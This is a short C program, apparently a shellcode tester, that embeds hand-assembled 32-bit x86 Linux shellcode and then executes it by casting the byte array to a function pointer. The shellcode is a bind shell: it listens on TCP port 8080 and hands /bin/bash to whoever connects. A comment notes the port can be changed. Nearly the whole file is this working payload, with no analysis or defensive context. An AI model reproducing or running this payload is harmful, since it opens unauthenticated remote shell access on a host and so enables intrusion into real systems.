#include<stdio.h>
#include<string.h>


unsigned char code[] = "\x31\xdb\xf7\xe3\x53\x43\x53\x43\x53\x4b\x89\xe1\xb0\x66\xcd\x80\x31\xf6\x43\x56\x66\x68"
//port number here
"\x1f\x90" // this is port 8080 in network byte

//change it if you want
"\x66\x53\x89\xe2\x6a\x10\x52\x50\x96\x89\xe1\xb0\x66\xcd\x80\x31\xff\x83\xc3\x02\x57\x56\x89\xe1\x89\xf8\xb0\x66\xcd\x80\x43\x57\x57\x56\x89\xe1\x89\xf8\xb0\x66\xcd\x80\x93\x89\xc1\xb0\x3f\xcd\x80\x49\x79\xf9\x57\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x57\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
